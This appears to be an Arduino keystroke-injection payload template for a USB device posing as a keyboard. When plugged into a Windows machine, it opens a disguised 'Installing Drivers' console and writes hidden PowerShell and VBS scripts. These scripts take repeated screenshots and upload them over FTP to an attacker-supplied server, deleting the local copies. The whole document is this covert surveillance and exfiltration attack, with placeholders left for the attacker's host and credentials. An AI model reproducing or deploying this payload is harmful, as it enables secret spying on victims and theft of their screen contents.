voide setup(){
  Keyboard.begin();
}

void loop(){
delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println(F("echo Add-Type -Assembly System.Windows.Forms  > %temp%\\ss.ps1"));
  Keyboard.println(F("echo mkdir $env:temp\\screens -Force  >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo While (1) {  >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $fn = $((get-date).toString('dd_MM_yyyy_HH_mm_ss')) + \".png\"  >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $sb = [Windows.Forms.SystemInformation]::VirtualScreen  >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $sso = New-Object Drawing.Bitmap $sb.Width, $sb.Height  >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $dg = [Drawing.Graphics]::FromImage($sso)  >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $dg.CopyFromScreen( $sb.Location, [Drawing.Point]::Empty, $sb.Size)  >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $dg.Dispose() >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $sso.Save(\"$env:temp\\screens\\$fn\") >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo $sso.Dispose() >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo sleep INPUT0 >> %temp%\\ss.ps1"));
  Keyboard.println(F("echo  } >> %temp%\\ss.ps1"));



  Keyboard.println(F("echo while(1)  {  > %temp%\\up.ps1"));
  Keyboard.println(F("echo  $wc = New-Object System.Net.webclient >> %temp%\\up.ps1"));
  Keyboard.println(F("echo  foreach($it in (ls $env:temp\\screens)) { >> %temp%\\up.ps1"));
  Keyboard.println(F("echo  $wc.UploadFile(\"ftp://INPUT2:INPUT3@INPUT4/INPUT5\" + $it.Name, $it.FullName) } >> %temp%\\up.ps1"));
  Keyboard.println(F("echo rm (\"$env:temp\\screens\" + \"\\*\") -Force  >> %temp%\\up.ps1"));
  Keyboard.println(F("echo sleep INPUT1 } >> %temp%\\up.ps1"));

  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\ss.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\ss.ps1\"),0,true >> %temp%\\ss.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\ss.vbs"));
  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\up.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\up.ps1\"),0,true >> %temp%\\up.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\up.vbs"));
  delay(3000);
  Keyboard.println(F("exit"));
  while(true);

}

DEFS
